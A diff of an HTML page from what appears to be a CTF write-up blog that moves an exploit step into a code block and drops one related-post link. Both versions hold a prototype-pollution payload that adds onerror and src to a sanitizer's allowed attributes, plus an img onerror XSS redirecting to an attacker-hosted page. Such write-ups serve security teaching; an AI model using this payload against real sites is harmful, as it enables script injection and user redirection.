@@ -270,11 +270,12 @@ app.makeToast();
 
 
 </code></pre><ol start="2">
-<li>Use the below payload for gaining the RCE
-keyword: <strong>proto</strong>[ALLOWED_ATTR][0]=onerror&amp;<strong>proto</strong>[ALLOWED_ATTR][1]=src
-append: <img src=1 onerror="document.location='<your html hosted file link>'"></li>
+<li>Use the below payload for gaining the RCE</li>
 </ol>
+<pre><code>keyword: __proto__[ALLOWED_ATTR][0]=onerror&amp;__proto__[ALLOWED_ATTR][1]=src
+append: &lt;img src=1 onerror=&quot;document.location='&lt;your html hosted file link&gt;'&quot;&gt;
 
+</code></pre>
             </div>
 
             
@@ -305,10 +306,6 @@ append: <img src=1 onerror="document.location='<your html hosted file link>'"></
                 
                     <li class="related-item">
                         <a href="/blogs/winjactf-nullcongoa2022/" class="related-link">Winja CTF Offical Writeup | Nullcon Goa 2022</a>
-                    </li>
-                
-                    <li class="related-item">
-                        <a href="/blogs/winjactf-nullconberlin2022/" class="related-link">WinjaCTF Official Writeup | Nullcon Berlin 2022</a>
                     </li>
                 
                     <li class="related-item">
